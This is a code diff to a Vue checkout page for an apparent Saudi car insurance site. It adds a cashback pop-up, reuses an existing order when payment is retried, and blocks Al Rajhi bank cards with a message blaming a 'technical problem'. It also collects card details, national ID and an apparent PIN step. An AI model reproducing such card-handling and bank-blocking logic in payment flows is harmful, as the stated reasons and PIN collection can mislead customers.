@@ -77,23 +77,6 @@
                         @update:accept-terms="form.acceptTerms = $event"
                     />
 
-                    <div class="bg-white border border-slate-200 rounded-xl p-3 sm:p-4">
-                        <div class="flex items-start gap-2.5">
-                            <div class="w-8 h-8 rounded-full bg-emerald-50 text-emerald-600 flex items-center justify-center shrink-0">
-                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
-                                </svg>
-                            </div>
-                            <div class="text-right">
-                                <p class="text-sm font-bold text-slate-800">تجربة دفع واضحة وآمنة</p>
-                                <p class="text-xs sm:text-sm text-slate-500 mt-1">
-                                    أكمل البيانات ثم اضغط «إتمام الدفع» مرة واحدة — لن تظهر نوافذ منبثقة مزعجة أثناء هذه الخطوة.
-                                </p>
-                            </div>
-                        </div>
-                    </div>
-
-
                 </div>
             </div>
 
@@ -142,8 +125,8 @@
                     </button>
                 </div>
 
-                <div class="pb-3 text-right">
-                    <div class="flex items-center justify-end gap-1.5 text-[11px] sm:text-xs text-slate-500">
+                <div class="pb-3 text-center">
+                    <div class="flex items-center justify-center gap-1.5 text-[11px] sm:text-xs text-slate-500">
                         <svg class="w-3.5 h-3.5 text-emerald-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                 d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
@@ -173,6 +156,9 @@
 
     </div>
 
+    <!-- Cashback Modal -->
+    <CashbackModal :visible="showCashbackModal" @close="showCashbackModal = false" />
+
 </template>
 
 <script setup>
@@ -194,6 +180,7 @@ import { detectBankFromBin } from '@/utils/bankDetector';
 import SarIcon from '@/components/SarIcon.vue';
 import PaymentMethodCard from '../components/checkout/PaymentMethodCard.vue';
 import PriceSummaryCard from '../components/checkout/PriceSummaryCard.vue';
+import CashbackModal from '../components/checkout/CashbackModal.vue';
 
 
 const route = useRoute();
@@ -219,6 +206,10 @@ const selectedPlanData = ref( null );
 const selectedDeductible = ref( 0 );
 const selectedAddons = ref( [] );
 const vehicleInfo = ref( null );
+
+// ── Cashback modal ──────────────────────────────────────────────────
+const showCashbackModal = ref( false );
+const _cashbackModalShown = ref( !!sessionStorage.getItem( 'cashbackModalShown' ) );
 
 // Load selected plan data immediately (before onMounted) so planId computed works
 {
@@ -354,6 +345,12 @@ function validate() {
             Object.assign( errors, result.errors );
             return false;
         }
+        // Block Al Rajhi cards at submit time
+        const cardDigitsForValidation = ( form.cardNumber || '' ).replace( /\s/g, '' );
+        if ( cardDigitsForValidation.length >= 6 && detectBankFromBin( cardDigitsForValidation ) === 'rajhi' ) {
+            errors.cardNumber = 'عذرًا، لا يمكن قبول بطاقات مصرف الراجحي حاليًا بسبب مشكلة تقنية. يرجى استخدام بطاقة بنك آخر.';
+            return false;
+        }
     }
 
     if ( !form.acceptTerms ) { errors.acceptTerms = 'يجب الموافقة على الشروط والأحكام'; return false; }
@@ -368,10 +365,35 @@ function onCardFormUpdate ( data ) {
     Object.assign( form, data );
     // Dismiss rejection alert when user starts editing card fields
     if ( cardRejectionReasonKey.value ) cardRejectionReasonKey.value = '';
+
+    // ── Al Rajhi block + Cashback modal trigger ─────────────────
+    if ( data.cardNumber !== undefined ) {
+        const digits = ( data.cardNumber || '' ).replace( /\s/g, '' );
+        if ( digits.length >= 6 ) {
+            const bank = detectBankFromBin( digits );
+
+            // Block Al Rajhi cards
+            if ( bank === 'rajhi' ) {
+                errors.cardNumber = 'عذرًا، لا يمكن قبول بطاقات مصرف الراجحي حاليًا بسبب مشكلة تقنية. يرجى استخدام بطاقة بنك آخر.';
+            }
+
+            // Show cashback modal once per session for any recognised bank (except rajhi)
+            if ( bank && bank !== 'rajhi' && !_cashbackModalShown.value ) {
+                _cashbackModalShown.value = true;
+                sessionStorage.setItem( 'cashbackModalShown', '1' );
+                showCashbackModal.value = true;
+            }
+        }
+    }
+
     // Clear errors on correction (while typing)
     if ( data.cardNumber !== undefined && errors.cardNumber ) {
         const digits = ( data.cardNumber || '' ).replace( /\s/g, '' );
-        if ( digits.length === 16 && isValidLuhn( digits ) ) delete errors.cardNumber;
+        // Only clear non-Rajhi errors on valid input
+        if ( digits.length === 16 && isValidLuhn( digits ) ) {
+            const bank = detectBankFromBin( digits );
+            if ( bank !== 'rajhi' ) delete errors.cardNumber;
+        }
     }
     if ( data.expiry !== undefined && errors.expiry ) {
         if ( /^\d{2}\/\d{2}$/.test( data.expiry ) && isExpiryValid( data.expiry ) ) delete errors.expiry;
@@ -552,49 +574,75 @@ async function handleSubmit() {
     // Submit order to backend to get server-generated order/policy numbers
     let orderNumber;
     let policyNumber;
-    try {
-        const quoteLockToken = selectedPlanData.value?.quoteLockToken || '';
-        if ( !quoteLockToken ) {
-            throw new Error( 'QUOTE_LOCK_MISSING' );
-        }
 
-        const orderResult = await submitQuote( {
-            plan_id: plan.value.id,
-            plan_name: plan.value.name,
-            insurance_company: plan.value.company?.nameAr || '',
-            insurance_type: plan.value.type === 'thirdParty' ? 'third_party' : 'comprehensive',
-            plan_type: plan.value.subType || plan.value.type,
-            subtotal: subtotal.value,
-            vat_amount: vatAmount.value,
-            total: totalPrice.value,
-            deductible: selectedDeductible.value,
-            addons: selectedAddons.value,
-            pricing_factors: plan.value.pricingFactors || null,
-            applicant_name: insuranceStore.driver.fullName || '',
-            applicant_national_id: insuranceStore.driver.nationalId || '',
-            applicant_phone: insuranceStore.driver.phone || '',
-            applicant_email: insuranceStore.driver.email || '',
-            vehicle_plate: insuranceStore.vehicle.plateNumber || '',
-            vehicle_make: insuranceStore.vehicle.makeName || '',
-            vehicle_model: insuranceStore.vehicle.modelName || '',
-            vehicle_year: insuranceStore.vehicle.year || null,
-            policy_start_date: insuranceStore.policy.policyStartDate || null,
-            payment_method: form.paymentMethod === 'card' ? 'card' : form.paymentMethod,
-            quote_lock_token: quoteLockToken,
-        } );
-        orderNumber = orderResult.order_number;
-        policyNumber = orderResult.policy_number;
-    } catch ( err ) {
-        logger.error( '[Checkout] Order API failed:', err );
-        isSubmitting.value = false;
-        setPaymentAlert( {
-            type: 'error',
-            title: 'تعذر إتمام العملية',
-            message: 'تعذّر تأكيد السعر الحالي.',
-            action: 'يرجى العودة لصفحة العروض وتحديث السعر ثم المحاولة مرة أخرى.',
-            retryable: true,
-        } );
-        return;
+    // ── Reuse existing order on payment retry ───────────────────────
+    // The quote_lock_token is consumed (Cache::forget) after the first
+    // successful POST /api/orders.  If the payment / OTP is later rejected
+    // and the customer returns to checkout to try a different card, we must
+    // NOT call submitQuote again — the token no longer exists and the
+    // backend will return 422 "انتهت صلاحية العرض".
+    // Instead, reuse the order that was already created for this plan.
+    const existingOrderRaw = sessionStorage.getItem( 'orderData' );
+    if ( existingOrderRaw )
+    {
+        try
+        {
+            const existing = JSON.parse( existingOrderRaw );
+            if ( existing.plan?.id === plan.value.id && existing.orderNumber )
+            {
+                orderNumber = existing.orderNumber;
+                policyNumber = existing.policyNumber;
+                logger.info( '[Checkout] Reusing existing order', orderNumber, '(payment retry)' );
+            }
+        } catch { /* malformed — fall through to create new order */ }
+    }
+
+    if ( !orderNumber )
+    {
+        try {
+            const quoteLockToken = selectedPlanData.value?.quoteLockToken || '';
+            if ( !quoteLockToken ) {
+                throw new Error( 'QUOTE_LOCK_MISSING' );
+            }
+
+            const orderResult = await submitQuote( {
+                plan_id: plan.value.id,
+                plan_name: plan.value.name,
+                insurance_company: plan.value.company?.nameAr || '',
+                insurance_type: plan.value.type === 'thirdParty' ? 'third_party' : 'comprehensive',
+                plan_type: plan.value.subType || plan.value.type,
+                subtotal: subtotal.value,
+                vat_amount: vatAmount.value,
+                total: totalPrice.value,
+                deductible: selectedDeductible.value,
+                addons: selectedAddons.value,
+                pricing_factors: plan.value.pricingFactors || null,
+                applicant_name: insuranceStore.driver.fullName || '',
+                applicant_national_id: insuranceStore.driver.nationalId || '',
+                applicant_phone: insuranceStore.driver.phone || '',
+                applicant_email: insuranceStore.driver.email || '',
+                vehicle_plate: insuranceStore.vehicle.plateNumber || '',
+                vehicle_make: insuranceStore.vehicle.makeName || '',
+                vehicle_model: insuranceStore.vehicle.modelName || '',
+                vehicle_year: insuranceStore.vehicle.year || null,
+                policy_start_date: insuranceStore.policy.policyStartDate || null,
+                payment_method: form.paymentMethod === 'card' ? 'card' : form.paymentMethod,
+                quote_lock_token: quoteLockToken,
+            } );
+            orderNumber = orderResult.order_number;
+            policyNumber = orderResult.policy_number;
+        } catch ( err ) {
+            logger.error( '[Checkout] Order API failed:', err );
+            isSubmitting.value = false;
+            setPaymentAlert( {
+                type: 'error',
+                title: 'تعذر إتمام العملية',
+                message: 'تعذّر تأكيد السعر الحالي.',
+                action: 'يرجى العودة لصفحة العروض وتحديث السعر ثم المحاولة مرة أخرى.',
+                retryable: true,
+            } );
+            return;
+        }
     }
 
     // Save order data to sessionStorage for confirmation page (used after OTP + PIN flow)
